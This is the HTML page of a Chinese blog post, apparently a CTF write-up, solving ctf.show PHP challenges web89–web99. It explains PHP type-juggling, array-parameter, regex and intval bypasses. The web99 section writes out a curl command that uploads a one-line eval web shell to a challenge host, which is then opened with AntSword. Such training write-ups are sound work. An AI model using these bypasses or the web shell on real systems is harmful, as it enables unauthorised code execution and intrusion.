@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://guo.moe/favicon.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://guo.moe/favicon.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guo.moe","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":true,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="web89PHP Version: 7.4.2 考点 请求参数可为数组  做题我们将它的代码复制下来再修改一下，好好折磨折磨">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【Klee-CTF】CTF.Show Web入门 PHP 特性 1 web89~web99">
+<meta property="og:url" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1.html">
+<meta property="og:site_name" content="果果说">
+<meta property="og:description" content="web89PHP Version: 7.4.2 考点 请求参数可为数组  做题我们将它的代码复制下来再修改一下，好好折磨折磨">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled%201.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled%202.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled%203.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled%204.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled%205.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled%206.png">
+<meta property="article:published_time" content="2021-08-30T04:00:00.000Z">
+<meta property="article:modified_time" content="2021-08-30T12:28:36.000Z">
+<meta property="article:author" content="Guoguo">
+<meta property="article:tag" content="果果说">
+<meta property="article:tag" content="果果的博客">
+<meta property="article:tag" content="Guoguo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled.png">
+
+<link rel="canonical" href="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>【Klee-CTF】CTF.Show Web入门 PHP 特性 1 web89~web99 | 果果说</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-69554402-1"></script>
+    <script data-pjax>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-69554402-1');
+      }
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="果果说" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">果果说</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Guoguo's Blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-友情链接">
+
+    <a href="/links/" rel="section"><i class="fa fa-user fa-fw"></i>友情链接</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://guo.moe/favicon.jpg">
+      <meta itemprop="name" content="Guoguo">
+      <meta itemprop="description" content="找不到路，就自己走一条出来。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="果果说">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【Klee-CTF】CTF.Show Web入门 PHP 特性 1 web89~web99
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-08-30 12:00:00 / 修改时间：20:28:36" itemprop="dateCreated datePublished" datetime="2021-08-30T12:00:00+08:00">2021-08-30</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/" itemprop="url" rel="index"><span itemprop="name">技术篇</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h1><p><code>PHP Version: 7.4.2</code></p>
+<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul>
+<li>请求参数可为数组</li>
+</ul>
+<h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>我们将它的代码复制下来再修改一下，好好折磨折磨</p>
+<span id="more"></span>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;fake_flag&#123;xxxxxx&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    highlight_file(__FILE__);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        print_r(<span class="variable">$num</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> intval(<span class="variable">$num</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(intval(<span class="variable">$num</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled.png" alt="Untitled"></p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled%201.png" alt="Untitled"></p>
+<p>如果随便输入一个单词，那么判断条件 intval 将会为 0；但如果在单词中夹入数字，会被preg_match过滤。</p>
+<p>但事实上，$_GET 里面这个 num 参数是可控的，它不仅仅可以是 int 或者 string， 还可以是 array。当 $num 为 array 时， preg_match 将无法发挥作用，并且 intval 在传入参数为数组时始终返回 1。通过下面代码进行测试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>(<span class="string">&quot;m2222&quot;</span> =&gt; <span class="string">&quot;a1111&quot;</span>, <span class="string">&quot;m223322&quot;</span> =&gt; <span class="string">&quot;a1111&quot;</span>)); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
+
+<p>所以，只要传入参数中 key 为数组，具体实现方式为变量后面添加 [] ，就可以绕过正则判断，同时还能使 intval 始终为 1。得以拿到flag。</p>
+<h1 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h1><p><code>PHP Version: 7.3.11</code></p>
+<h2 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h2><ul>
+<li>利用进制不同来绕开强类型判断</li>
+<li>利用 intval 去掉小数点获得flag</li>
+<li>利用 %00 截断参数</li>
+<li>在数字后面添加任意字母拿到的都是数字</li>
+<li>利用字符隔断某整数之后的数字</li>
+</ul>
+<h2 id="做题-1"><a href="#做题-1" class="headerlink" title="做题"></a>做题</h2><p>我特意去翻了翻 intval 相关的参数代表着什么（<a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-intval-function.html">https://www.runoob.com/php/php-intval-function.html</a>），发现其中一句话写的就是</p>
+<blockquote>
+<p>如果 base 是 0，通过检测 var 的格式来决定使用的进制：<br>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，<br>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，<br>将使用 10 进制 (decimal)。</p>
+</blockquote>
+<p>好家伙，送分。</p>
+<p>这题n个思路m个答案，</p>
+<ul>
+<li>十六进制的4476为 <code>0x117c</code> ，直接写入请求参数即可。（适用于 web92）</li>
+<li>另一种是8进制，写入<code>010574</code>。（适用于 web92, web93）</li>
+<li>还有一种是利用它整数性质，intval会将小数点去掉，参数写入 <code>4476.*</code> 即可获得flag。（适用于 web92, web93）</li>
+<li>还有一种方法是在4476后面加入 <code>%00</code> ，成功绕过强类型判断</li>
+<li>还有一种方法是在4476后面加乱七八糟的东西，应该和上一个原理差不多，比如<code>4476你爱我，我爱你，蜜雪冰城甜蜜蜜</code></li>
+<li>对于 web94 ，第三个条件为判断0的位置，如果不存在0或者存在0放在第一个都会die，那就加一个符号将它隔断，比如 <code>4476;0</code></li>
+</ul>
+<h1 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h1><p><code>PHP Version: 7.3.11</code></p>
+<h2 id="做题-2"><a href="#做题-2" class="headerlink" title="做题"></a>做题</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>两个判断最大的区别就是一个是 /im ， 一个是/i。我特地去查了一下这两个究竟有啥区别</p>
+<blockquote>
+<p>i modifier: insensitive. Case insensitive match (ignores case of [a-zA-Z])<br>m modifier: multi line. Causes ^ and $ to match the begin/end of each line (not only begin/end of string)</p>
+</blockquote>
+<p>于是我在自己环境尝试替换了一下变量</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//$a=$_GET[&#x27;cmd&#x27;];</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;php\nphp&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>结果不进下一个变量了。究其原因关键可能还在于这个 ^和$，也就导致它一行字符串只能出现 php，而 /im 允许出现多行， /i 只能在一行上出现，php\nphp满足了两行字符串均为php，而无法满足在一个字符串内全为php的条件。当然，这个$a可不能直接当参数，还得 urlencode 一下，最后结果为 <code>php%0Aphp</code></p>
+<h1 id="web92-web94"><a href="#web92-web94" class="headerlink" title="web92~web94"></a>web92~web94</h1><p>见 web90</p>
+<h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><p><code>PHP Version: 7.3.11</code></p>
+<p>兼容 web90, web92~web94, web95</p>
+<h2 id="做题-3"><a href="#做题-3" class="headerlink" title="做题"></a>做题</h2><p>这题中第一个判断条件使用了弱类型判断，隔绝了在4476后面加任意字符串的做法。</p>
+<p>同时在第二个判断条件使用了小数点和字母判断，隔绝了使用小数或者十六进制的做法。</p>
+<p>在第三个判断条件引入了判断0的位置，看似隔绝了八进制的做法，因为八进制的0是在第一个的，也就是位置为0，判断时0是false。</p>
+<p>但是，我没想到八进制的0还可以不在第0位，只要在前面加个+或者空格就行。</p>
+<p>使用  <code>010574</code> 或者<code>+010574</code> 即可获得flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h1><p><code>PHP Version: All</code></p>
+<h2 id="考点-2"><a href="#考点-2" class="headerlink" title="考点"></a>考点</h2><ul>
+<li>绝对路径绕过</li>
+</ul>
+<h2 id="做题-4"><a href="#做题-4" class="headerlink" title="做题"></a>做题</h2><p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled%202.png" alt="Untitled"></p>
+<p>随便输点东西可以获得其绝对路径 <code>/var/www/html</code>，然后将参数替换为 <code>/var/www/html/flag.php</code>即可获得flag。</p>
+<h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><p><code>PHP Version: All</code></p>
+<h2 id="考点-3"><a href="#考点-3" class="headerlink" title="考点"></a>考点</h2><ul>
+<li>简单的 md5 碰撞</li>
+</ul>
+<h2 id="做题-5"><a href="#做题-5" class="headerlink" title="做题"></a>做题</h2><p>参考资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_19980431/article/details/83018232">https://blog.csdn.net/qq_19980431/article/details/83018232</a></p>
+<p>因为判断条件中等于号为强类型判断，所以原有的 a:QNKCDZO b:s878926199a 就不好用了。</p>
+<p>但是利用上面的，请求参数是可以放一个数组的，我们尝试一下放一个数组会怎样，我们写一个简单的 PHP 程序来测试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled%203.png" alt="Untitled"></p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled%204.png" alt="Untitled"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP Warning: md5() expects parameter <span class="number">1</span> to be <span class="keyword">string</span>, <span class="keyword">array</span> given in /Users/kelly/Documents/Program/PHP/CTFShow/web97.php on line <span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>经过简单调试后，我们发现 md5() 一个数组的话，会抛出异常，同时赋值的变量也会变为<code>null</code>。再看其中一个判断条件，<code>md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])</code> </p>
+<p>巧了吗不是，<code>null==null</code>，所以我们只需要在a参数和b参数上分别填上两个数组即可拿到flag。</p>
+<h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><p><code>PHP Version: All</code></p>
+<h2 id="考点-4"><a href="#考点-4" class="headerlink" title="考点"></a>考点</h2><ul>
+<li>指针</li>
+</ul>
+<h2 id="做题-6"><a href="#做题-6" class="headerlink" title="做题"></a>做题</h2><p>我们来分析一下这个代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 21:39:27</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">highlight_file(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>首先看highlight_file 这个最关键的，这个 $flag 应该就是从 flag.php 中拿出来的 flag，所以关键的就是要修改 $_GET[‘HTTP_FLAG’] 的值，来让它引入 $flag 从而产生报错。</p>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>改POST为GET。我们可以看到，第一行中的 $_GET 就足以产生影响。所以我们可以先构造 POST 的参数为 HTTP_FLAG，再随便写一个 GET 参数，这样就可以看到报错信息拿到flag了。</p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled%205.png" alt="Untitled"></p>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>先将参数改POST为GET，再改为COOKIE。</p>
+<p>由于第一步有一个置换 $_GET 的过程，也就是说你想修改 $_GET 变量就必定会执行 <code>$_GET?$_GET=&amp;_POST:&#39;flag&#39;;</code>，所以要使下一行<code>$_GET[&#39;flag&#39;]==&#39;flag&#39;?$_GET=&amp;$_COOKIE:&#39;flag&#39;;</code>生效，POST的参数就必须有 flag:flag ，同时 <code>$_COOKIE[&#39;HTTP_FLAG&#39;]==&#39;flag&#39;</code></p>
+<p>最后curl请求为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl --location --request POST <span class="string">&#x27;http://09063fa0-4302-4c56-aa44-ce9b71e4eb40.challenge.ctf.show:8080/?flag=flag&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;Cookie: HTTP_FLAG=flag&#x27;</span> \</span><br><span class="line">--form <span class="string">&#x27;flag=&quot;flag&quot;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>套娃，先将参数改POST为GET，再改为COOKIE，再改Header。</p>
+<p>前两步和之前一样，cookie改为 flag=flag，同时再在请求头加入 flag=flag，最后curl请求为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl --location --request POST <span class="string">&#x27;http://09063fa0-4302-4c56-aa44-ce9b71e4eb40.challenge.ctf.show:8080/?flag=flag&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;Cookie: flag=flag&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;flag: flag&#x27;</span> \</span><br><span class="line">--form <span class="string">&#x27;flag=&quot;flag&quot;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h1><p><code>PHP Version: All</code></p>
+<h2 id="做题-7"><a href="#做题-7" class="headerlink" title="做题"></a>做题</h2><p>说实话，我真没搞懂这个要干啥，因为尝试了一下 233.php 加一句话木马就可以了。。。</p>
+<p>然后我丢到 phpstorm 调试了一下，哦感情这是抽卡呢…</p>
+<p>其实主要是因为这个for循环的范围太广了， <code>$i=36; $i &lt; 0x36d; $i++</code> 一共可以插800多个，运气好可以插到小数点和php的ascii码。不行就多试几次</p>
+<p>参数如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl --location --request POST <span class="string">&#x27;http://2da731a5-dc75-499b-ae8f-ac7202e78130.challenge.ctf.show:8080/?n=233.php&#x27;</span> \</span><br><span class="line">--form <span class="string">&#x27;content=&quot;&lt;?php eval($_POST[0]); ?&gt;&quot;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后丢到 AntSword 里面看一下，里面有个 flag36d.php，打开就能拿到flag。</p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-collect-info-PHP-feature-1/Untitled%206.png" alt="Untitled"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/archives/CTF-Show-Get-Started-with-the-web-collect-info-Extension.html" rel="prev" title="【Klee-CTF】CTF.Show Web入门 信息收集 (Web补充)">
+      <i class="fa fa-chevron-left"></i> 【Klee-CTF】CTF.Show Web入门 信息收集 (Web补充)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/archives/CTF-Show-Get-Started-with-the-web-blasting.html" rel="next" title="【Klee-CTF】CTF.Show Web入门 爆破 web21~web28">
+      【Klee-CTF】CTF.Show Web入门 爆破 web21~web28 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
